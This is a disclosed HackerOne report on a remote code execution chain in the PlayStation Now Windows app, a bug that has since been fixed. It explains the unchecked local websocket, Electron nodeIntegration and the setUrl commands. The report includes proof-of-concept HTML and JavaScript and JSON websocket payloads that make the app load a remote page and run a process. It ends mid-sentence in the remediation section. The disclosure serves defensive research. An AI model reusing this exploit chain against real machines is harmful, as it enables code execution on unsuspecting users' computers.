{"id":873614,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzM2MTQ=","url":"https://hackerone.com/reports/873614","title":"Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-05-13T18:44:26.671Z","submitted_at":"2020-05-13T18:44:26.671Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"parsiya","url":"/parsiya","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":44879,"url":"https://hackerone.com/playstation","handle":"playstation","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PlayStation","twitter_handle":"PlayStation","website":"https://www.playstation.com","about":"Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-12-04T18:04:55.058Z","bug_reporter_agreed_on_going_public_at":"2020-06-28T15:11:08.770Z","team_member_agreed_on_going_public_at":"2020-12-04T18:04:54.940Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"15000.0","formatted_bounty":"$15,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":483,"voters":["4n_curze","pmnh","acut3","pretorian","jarij","ds82","badf00d","sw33tlie","nytr0gen","kyy","and 473 more..."],"severity":{"rating":"critical","score":9.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"high","availability":"low"}},"structured_scope":{"databaseId":40737,"asset_type":"OTHER","asset_identifier":"PlayStation Network","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7992689,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-13T18:50:48.617Z","updated_at":"2020-05-13T18:50:48.617Z","additional_data":{},"actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7992717,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-13T18:54:25.874Z","updated_at":"2020-05-13T18:54:25.874Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7992979,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-13T19:24:54.243Z","updated_at":"2020-05-13T19:24:54.243Z","actor":{"username":"hacker-01","cleared":false,"url":"/hacker-01","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/GtMbCEXGLm3EdU16BiXgTXMV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7993543,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-13T20:06:50.459Z","updated_at":"2020-05-13T20:06:50.459Z","actor":{"username":"hacker-01","cleared":false,"url":"/hacker-01","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/GtMbCEXGLm3EdU16BiXgTXMV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8042737,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-19T00:48:29.876Z","updated_at":"2020-05-19T00:48:29.876Z","actor":{"username":"hacker-01","cleared":false,"url":"/hacker-01","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/GtMbCEXGLm3EdU16BiXgTXMV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8045843,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-19T09:04:55.919Z","updated_at":"2020-05-19T09:04:55.919Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8051955,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-19T19:49:14.145Z","updated_at":"2020-05-19T19:49:14.145Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8072502,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-21T19:48:51.874Z","updated_at":"2020-05-21T19:48:51.874Z","actor":{"url":"/playstation","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PlayStation"}},"bounty_amount":"15000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"playstation","collaborator":{"username":"parsiya","url":"/parsiya"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8073505,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-21T22:35:57.907Z","updated_at":"2020-05-21T22:35:57.907Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8226160,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-07T22:45:57.087Z","updated_at":"2020-06-07T22:45:57.087Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8410024,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-25T18:19:37.910Z","updated_at":"2020-06-25T18:19:37.910Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"parsiya","url":"/parsiya"},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8435588,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-28T15:10:01.038Z","updated_at":"2020-06-28T15:10:01.038Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8435592,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-28T15:11:08.797Z","updated_at":"2020-06-28T15:11:08.797Z","first_to_agree":true,"actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8981226,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-19T17:38:07.620Z","updated_at":"2020-08-19T17:38:07.620Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8992646,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-20T18:09:06.479Z","updated_at":"2020-08-20T18:09:06.479Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8992652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-20T18:09:41.535Z","updated_at":"2020-08-20T18:09:41.535Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9172394,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-09T16:47:15.247Z","updated_at":"2020-09-09T16:47:15.247Z","actor":{"username":"hacker-01","cleared":false,"url":"/hacker-01","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/GtMbCEXGLm3EdU16BiXgTXMV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9177834,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-10T08:36:10.134Z","updated_at":"2020-09-10T08:36:10.134Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9525210,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-14T20:00:41.785Z","updated_at":"2020-10-14T20:00:41.785Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9570677,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-20T03:11:25.370Z","updated_at":"2020-10-20T03:11:25.370Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9881085,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-20T17:27:48.781Z","updated_at":"2020-11-20T17:27:48.781Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9884742,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-21T07:39:14.736Z","updated_at":"2020-11-21T07:39:14.736Z","actor":{"username":"parsiya","cleared":false,"url":"/parsiya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/212/d257edba9e56c8c154702aaa2d50211c0b04a1a1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10008693,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-04T18:04:54.964Z","updated_at":"2020-12-04T18:04:54.964Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10008694,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-04T18:04:55.088Z","updated_at":"2020-12-04T18:04:55.088Z","actor":{"username":"serv","cleared":false,"url":"/serv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Rs7SWj52yyghzz7wN6DUx7Dw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"playstation","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":25733,"category":"team","content":"-","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e-\u003c/p\u003e\n"},{"id":25536,"category":"researcher","content":"# Summary\nThe PlayStation Now application version `11.0.2` is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.\n\n1. The local websocket server at `localhost:1235` does not check the origin of incoming requests.\n    1. This allows websites loaded in browsers on the same machine to send requests to the websocket server.\n    2. Websockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.\n2. psnow launches an Electron application named `AGL`.\n    1. It's possible to tell AGL to load a specific website with a command sent to the websocket server.\n    2. As a result, the websites above can tell AGL to load any remote URL.\n    3. It's also possible to tell `AGL` to run any local application via the `setUrlDefaultBrowser` command.\n3. The AGL Electron application has `nodeIntegration: true` so JavaScript running in any loaded URL can spawn new processes.\n    1. So any URL loaded in the AGL application can run code on the target machine.\n\nChaining these three issues gives us RCE.\n\n# Description\nThe PlayStation Now application (`psnow` moving forward) is an online streaming application for playing PlayStation games. Version `11.0.2` is the current version at the time of writing. The latest version can be downloaded from https://download-psnow.playstation.com/downloads/psnow/pc/latest.\n\nIt has two major components: `QAS` and `AGL`.\n\n## QAS\n`QAS` is an executable named `psnowlauncher.exe` and is a Qt5 desktop application. This is the main application that is executed when the user runs psnow. The default installation location is `C:\\Program Files (x86)\\PlayStationNow\\psnowlauncher.exe`.\n\nNote: Running it in a Virtual Machine (VM) returns a warning. This can be ignored for this walkthrough.\n\nAfter launch, it runs a different application called `AGL`. The following picture is the complete list of processes in Process Monitor.\n\nProcesses in procmon:\n\n{F827146}\n\nThe QAS application also runs a websocket server at `localhost:1235`. `netstat -anb` in an elevated command line tells us about it:\n\nwebsocket server:\n\n{F827147}\n\n## AGL\n`AGL` is an Electron application. In a typical execution, it's spawned by QAS. In the current version, it's run with this `url` command line parameter:\n\n* `\"C:\\Program Files (x86)\\PlayStationNow\\agl\\agl.exe\" --url=https://psnow.playstation.com/app/1.10.43/105/00d3603f8/`\n\nThis is the URL of the page that will be initially loaded by the AGL application.\n\nAGL execution\n\n{F827149}\n\n### Issue 1: nodeIntegration Set to true\n`nodeIntegration` is the ability for the JavaScript running in an Electron [BrowserWindow][browser-window] to access the Node.js APIs. The default value is `false` but it is set to `true` in AGL. Any JavaScript loaded by AGL will be able to spawn processes on the machine. This can lead to arbitrary code execution. The AGL application performs no checks on what URLs it loads.\n\n[browser-window]: https://www.electronjs.org/docs/api/browser-window\n\nWe can check this by running AGL from the command line with a URL that contains some Node code. The following code spawns a new processes and runs the Windows Calculator app (calc).\n\n```html\n\u003chtml\u003e\n    \u003chead\u003e\n        \u003ctitle\u003eThis should pop calc on Windows\u003c/title\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        \u003cscript\u003e\n            require('child_process')\n            .exec('calc')\n        \u003c/script\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n\nI have stored this payload in an S3 bucket. If we load that remote URL in AGL we can see calc spawning. To reproduce, run the following command in a VM and see AGL running the calculator application:\n\n`\"C:\\Program Files (x86)\\PlayStationNow\\agl\\agl.exe\" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html`\n\nPopping calc:\n\n{F827156}\n\nWe can see the new processes in Process Monitor:\n\n{F827151}\n\nThis is not that useful. We can run code on our own machine, WOW! As Raymond Chen said [It rather involved being on the other side of this airtight hatchway][hatchway].\n\n[hatchway]: https://devblogs.microsoft.com/oldnewthing/20060508-22/?p=31283\n\n## Proxying The Applications\nWe can proxy psnow with Burp. Use the Windows proxy settings (WinINET proxy settings).\n\n1. Run `control.exe inetcpl.cpl,,4`. This opens the Windows proxy settings without having to open Internet Explorer.\n2. Click on `LAN Settings` and set the proxy.\n    1. Make sure nothing under `Automatic Configuration` is checked.\n    2. Make sure the `Bypass proxy server for local addresses` is **NOT checked**.\n3. Set the proxy to the listener, Burp's default is `127.0.0.1:8080`.\n4. Add Burp's Certificate Authority (CA) to the Windows certificate store.\n    1. https://portswigger.net/support/installing-burp-suites-ca-certificate-in-internet-explorer\n    2. The instructions mention Internet Explorer but it's actually for Windows.\n\n### Identifying Traffic in Burp\nIn Burp, we will see traffic to/from both QAS and AGL. There is other traffic (e.g, browser traffic, Windows update). The traffic from psnow has the word `gkApollo` in its `User-Agent` header.\n\nThe user-agent for requests coming from the two applications has more indicators:\n\n* QAS is the Qt5 app and has `QtWebEngine/5.5.1`.\n* AGL is based on Electron and it has `Electron/1.4.16` and `playstation-now/0.0.0`.\n\nI am using a Burp extension named [Request Highlighter][request-highlighter] to highlight requests based on these words in the user-agent.\n\n[request-highlighter]: https://portswigger.net/bappstore/11729a617d8d4d3b87c82e34b71885c3\n\nIn my setup, AGL (Electron) is yellow and QAS (Qt5) is blue.\n\n{F827153}\n\n## Local Websocket Server\nQAS starts a local websocket server on port `1235`. Then the website loaded in AGL (in this case \"psnow.playstation.com/app/\") connects to it and sends commands to the server.\n\n### Issue 2: Local Websocket Server does not Check the Origin Header\nThis is a vulnerable setup for seamless communication between a website and a desktop application. A website sends requests to a local webserver to do something (e.g., launch an application). This setup is vulnerable if the local server does not check the Origin header and/or where the request is coming from.\n\nSome examples of other vulnerable setups:\n\n[Tavis Ormandy][taviso-twitter] from Google Project Zero found a very similar setup in Logitech Options.\n\n* https://bugs.chromium.org/p/project-zero/issues/detail?id=1663\n\n[taviso-twitter]: https://twitter.com/taviso\n\nAnother by TavisO for TrendMicro. Not websocket but involved a local webserver: https://bugs.chromium.org/p/project-zero/issues/detail?id=693\n\nZoom used a local webserver to automatically launch the application from the website. Disclosure by [Jonathan Leitschuh][jon-1].\n\n[jon-1]: https://twitter.com/JLLeitschuh\n\n* https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5\n\n**Why is this bad?** Any website can send these commands. This means I can put JavaScript code on my own website. If a user running psnow opens my website on the same machine (in any browser), my website connects to `http://localhost:1235` and sends requests to the websocket server. These requests will be processed.\n\n### Yet Another Chat Application as Proof of Concept\nI stole the client code of a websocket chat app and modified it to simulate the evil website. This small app connects to `ws://localhost:1235`, prints any message received and allows us to send messages at will. You can see the source at:\n\n* https://[redacted].s3.amazonaws.com/agl-poc/chat-ws.html\n* Open the page in a browser in a different machine and see the source. It's simple enough that I could understand it.\n\n1. Start the psnow app in a VM.\n2. Open the above URL in a browser in the same VM.\n3. See the websocket messages from the psnow app in the browser.\n    1. If we keep the chat app running, it will keep printing messages received from the client.\n4. Send any message to the local server via the text field.\n\n{F827145}\n\n## Websocket Messages\nNow we need to look into the websocket messages and how we can exploit them.\n\nAfter opening the initial URL at `https://psnow.playstation.com/app/1.10.43/105/00d3603f8/` we can see the `Connection: Upgrade` request to this server from `psnow.playstation.com`. This is coming from the psnow website loaded in AGL. The initial request is a typical websocket handshake.\n\n{F827150}\n\nNow we can switch to the `Proxy \u003e Websockets history` tab in Burp to see the websocket messages.\n\n{F827152}\n\nAll the requests are in JSON (probably created by `JSON.stringify`). The interesting ones start with `command`. For example:\n\n```json\n{\n  \"command\": \"isMicConnected\",\n  \"params\": {},\n  \"source\": \"AGL\",\n  \"target\": \"QAS\"\n}\n```\n\n* `command`: What to do.\n* `params`: Command parameters.\n* `source`: The program issuing the command.\n* `target`: The program running the command.\n\nBoth target and source can be the same app. I do not think it really matters what the source is. I think only `target` is mandatory.\n\nWe can search for more commands in websocket messages. The most important command is `setUrl`. There are more commands in the source of the Electron app (unpack `app.asar` and search for `commandHandler`) but this is the most useful along with `setUrlDefaultBrowser` (opens a URL in the default browser on the machine).\n\n{F827154}\n\n```json\n{\n  \"command\": \"setUrl\",\n  \"params\": {\n    \"url\": \"https://psnow.playstation.com/app/1.10.43/105/00d3603f8/\"\n  },\n  \"source\": \"AGL\",\n  \"target\": \"QAS\"\n}\n```\n\nThis is AQL telling QAS to load this URL. QAS will then go and load that URL. We can send this request to Burp Repeater and send the message again with a different URL. For example, let's tell QAS to load `https://example.net`.\n\n{F827155}\n\nBut this is not fun. We want AGL to load websites and not QAS. **WHAT IF** we switched target and source?\n\n```\n{\"command\":\"setUrl\",\"params\":{\"url\":\"https://example.net\"},\"source\":\"QAS\",\"target\":\"AGL\"}\n```\n\nThis command will tell AGL (the Electron app) to load `example.net`. The gif has been minimized, please click on it to enlarge it:\n\n{F827144}\n\n\nLater, I found out that we can use another TavisO bug to get RCE another way. https://bugs.chromium.org/p/project-zero/issues/detail?id=693\n\nWe can abuse the `setUrlDefaultBrowser` command. It gets passed to `shell.openExternal(url)` and allows the `file` scheme.\n\nSo the following command should pop calc:\n\n```\n{\"command\":\"setUrlDefaultBrowser\",\"params\":{\"url\":\"file:///c:/windows/system32/calc.exe\"},\"source\":\"QAS\",\"target\":\"AGL\"}\n```\n\nNote: `QAS` does not have this command.\n\nWebsockets are not bound by the Same-Origin Policy so any website can send these messages. For an explanation please see https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc.\n\n## Issue 3: You Can Tell AGL to Load Arbitrary Websites\nA single websocket message is enough to make AGL load any URL. There are no restrictions here. This is not great, considering we saw what bad code on a website can do to AGL.\n\n## Putting Everything Together\nSo far we have established three things:\n\n1. If a website with Node code is loaded in AGL, we can run arbitrary on the target's machine.\n2. Any website opened in the browser on a machine with psnow running can connect to the local websocket and send messages.\n3. A websocket command with `setUrl` or `setUrlDefaultBrowser` can tell AGL to load any URL.\n\n### Possible Attack Scenario\n\n1. User is running psnow on their machine.\n    1. Note that when the users close the psnow window it gets minimized to tray and is still running. So there's a good chance that psnow is running  if they have used it in the same session. The websocket server is still running when the application is minimized.\n2. The user opens a website in their browser. Any browser will do.\n    1. Someone can post a link to a website with bad code in chat/Discord, it could be a link on forums. The possibilities are endless.\n3. The website in the browser connects to the websocket server at `ws://localhost:1235`.\n4. The website sends a message to the websocket server. The message tells AGL to load another website that contains node code.\n    1. `{\"command\":\"setUrl\",\"params\":{\"url\":\"https://[redacted].s3.us-east-1.amazonaws.com/node.html\"},\"source\":\"QAS\",\"target\":\"AGL\"}`\n    2. Alternatively, it can abuse the `setUrlDefaultBrowser` command.\n5. AGL loads the new website. Arbitrary code runs on the user's machine.\n6. ???\n7. RCE.\n\n## Steps To Reproduce:\nIf you have read up until here, you deserve a calc popping gif.\n\n1. Run psnow in a VM.\n2. Go to the following URL in a browser on the same machine:\n    1. https://[redacted].s3.amazonaws.com/agl-poc/calc-ws.html\n3. Watch calc pop.\n4. Optionally, paste the following command in the text field and press send to see calc pop again.\n    1. `{\"command\":\"setUrl\",\"params\":{\"url\":\"https://[redacted].s3.us-east-1.amazonaws.com/node.html\"},\"source\":\"QAS\",\"target\":\"AGL\"}`\n    2. You can also do other fun things like enabling dev tools.\n\nThe code in `calc-ws` is similar to the chat code. After the socket to the local websocket server opens, the payload above is sent. See the modification heres:\n\n```js\nlet url = 'ws://localhost:1235/'\n\nlet socket = new WebSocket(url);\n\nlet payload = '{\"command\":\"setUrl\",\"params\":{\"url\":\"https://[redacted].s3.us-east-1.amazonaws.com/node.html\"},\"source\":\"QAS\",\"target\":\"AGL\"}';\n\n// send the payload when the socket is opened.\nsocket.onopen = function(event) {\n  showMessage('before payload');\n  socket.send(payload);\n  showMessage('after payload');\n};\n```\n\nThe following gif shows the whole chain. Again, please see it in full-size.\n\n{F827148}\n\n### Bonus: Minor Issue 0: Websocket Server Listening on 0.0.0.0\nThe application is listening on all interfaces (`0.0.0.0`) which is problematic. This is also not fun because the Windows firewall prompt will pop up when its executed for the first time. Meaning anyone who can contact this port **might** be able to send commands to this websocket server.\n\n## Remediation or How Can We Fix This?\n\n* Quick and effective win: The local websocket server should validate the `Origin` header of the incoming request and only allow requests from good Origins specified in a list.\n    * This is the same recommendation by TavisO in 